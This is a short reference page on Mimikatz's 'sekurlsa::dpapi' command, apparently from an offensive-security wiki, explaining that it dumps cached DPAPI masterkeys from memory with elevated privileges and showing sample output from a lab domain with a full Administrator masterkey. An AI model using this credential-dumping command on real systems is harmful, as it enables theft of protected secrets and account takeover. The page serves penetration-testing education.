# dpapi

`sekurlsa::dpapi` lists DPAPI cached masterkeys (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)).

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::dpapi

Authentication Id : 0 ; 227854 (00000000:00037a0e)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : hacklab
Logon Server      : DC
Logon Time        : 10/17/2021 4:19:23 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-500
         [00000000]
         * GUID      :  {0686f7cf-76f3-413b-a51e-28d0d0531013}
         * Time      :  10/17/2021 4:21:59 AM
         * MasterKey :  6b5b148b9244efab617e417936227286c24d340cfb9900cc632dcf1d10fd258d16337df2e090251851dec676d9d525b1fc5bd99c9383084fd0e9f4d0c45a3b0e
         * sha1(key) :  c5049248822679fdb3e60ba37531ae3e805f7122
```
